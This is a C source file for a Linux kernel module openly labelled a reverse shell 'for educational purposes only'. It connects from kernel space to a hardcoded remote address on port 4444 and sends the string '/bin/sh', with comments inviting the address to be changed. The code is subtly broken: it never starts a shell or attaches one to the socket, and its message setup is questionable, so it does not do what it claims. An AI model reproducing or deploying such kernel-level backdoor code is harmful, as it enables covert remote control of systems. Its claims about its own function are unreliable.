#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/uaccess.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("reverse shell kernel module (for educational purposes only)");

#define REMOTE_IP "192.168.56.1"  // replace with the target IP
#define REMOTE_PORT 4444       // replace with the target port
#define SHELL_CMD "/bin/sh"

static struct socket *client_socket = NULL;

static int __init reverse_shell_init(void) {
  struct sockaddr_in sa;
  char *shell_command = SHELL_CMD;
  int ret;
  struct msghdr msg;
  struct iovec iov;
  struct kvec kvec;

  // create the socket
  ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &client_socket);
  if (ret < 0) {
    printk(KERN_ERR "error creating socket\n");
    return ret;
  }

  // set up the server address
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(REMOTE_PORT);
  sa.sin_addr.s_addr = in_aton(REMOTE_IP);

  // connect to the remote server
  ret = client_socket->ops->connect(client_socket, (struct sockaddr *)&sa, sizeof(sa), 0);
  if (ret < 0) {
    printk(KERN_ERR "failed to connect to the server\n");
    sock_release(client_socket);
    return ret;
  }

  printk(KERN_INFO "connected to %s:%d\n", REMOTE_IP, REMOTE_PORT);

  // prepare the message to send
  iov.iov_base = shell_command;
  iov.iov_len = strlen(shell_command);

  // initialize msg iter
  msg.msg_name = (struct sockaddr *)&sa;
  msg.msg_namelen = sizeof(sa);
  msg.msg_iter.iov = &iov;
  msg.msg_iter.count = strlen(shell_command);  // use count instead of iovlen

  // send the shell command
  ret = client_socket->ops->sendmsg(client_socket, &msg, strlen(shell_command));
  if (ret < 0) {
    printk(KERN_ERR "failed to send command\n");
    sock_release(client_socket);
    return ret;
  }

  printk(KERN_INFO "shell command sent\n");

  return 0;
}

static void __exit reverse_shell_exit(void) {
  if (client_socket) {
    sock_release(client_socket);
  }
  printk(KERN_INFO "reverse shell module unloaded\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
